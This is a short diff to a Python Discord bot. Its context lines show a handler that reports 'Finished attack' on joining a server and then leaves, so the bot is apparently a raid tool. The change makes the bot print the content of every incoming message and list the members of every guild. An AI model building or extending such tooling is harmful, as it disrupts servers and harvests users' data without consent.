@@ -96,10 +96,15 @@ async def on_guild_join(guild): # If the bot joins a guild
     print(f"{r} [{w}!{r}] Finished attack, leaving server.\n") # Warn the user its about to leave a guild
     await guild.leave() # Leave the guild
 
-@client.event
+@bot.event
 async def on_message(message):
     if message.content.startswith('!member'):
-        for guild in client.guilds:
+        for guild in bot.guilds:
+            for member in guild.members:
+                print(member) # or do whatever you wish with the member detail
+    else:
+        print('DM Message', message.content)
+        for guild in bot.guilds:
             for member in guild.members:
                 print(member) # or do whatever you wish with the member detail
 
